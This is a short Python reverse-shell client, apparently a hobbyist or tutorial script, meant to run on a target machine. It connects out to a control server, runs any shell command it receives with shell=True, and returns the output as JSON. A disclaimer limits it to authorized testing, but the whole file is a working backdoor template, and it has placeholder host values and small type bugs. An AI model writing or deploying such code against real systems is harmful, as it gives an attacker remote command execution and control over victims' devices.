# WARNING: This script is for **educational and authorized use only**.
# Unauthorized access to devices or systems using this code is strictly illegal and unethical.
# Use this code only on systems you own or have explicit permission to test.
# The author takes no responsibility for misuse.

# This code must be in the target device


import socket
import subprocess
import json
import os

class MySocket:
    def __init__(self, ip, port):
        # Create a TCP socket and connect to the given IP and port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def command_execution(self, command):
        # Execute a shell command and return the output
        return subprocess.check_output(command, shell=True)

    def json_send(self, data):
        # Convert the data to JSON and send it over the connection
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def json_receive(self):
        # Receive data and decode it from JSON
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                # Wait until complete JSON data is received
                continue

    def execute_cd_command(self, directory):
        # Change the current working directory
        os.chdir(directory)
        return "Changed directory to " + directory

    def start_socket(self):
        # Main loop to handle incoming commands
        while True:
            command = self.json_receive()
            if command[0] == "quit":
                # Close the connection and exit
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                # Handle 'cd' command separately
                command_output = self.execute_cd_command(command[1])
            else:
                # Execute other shell commands
                command_output = self.command_execution(command)

            # Send back the result of the command
            self.json_send(command_output)

        self.connection.close()

# Replace with the IP and port of the control server (must be your own or authorized test environment)
my_socket_object = MySocket("your_ip_address", "int type port number")
my_socket_object.start_socket()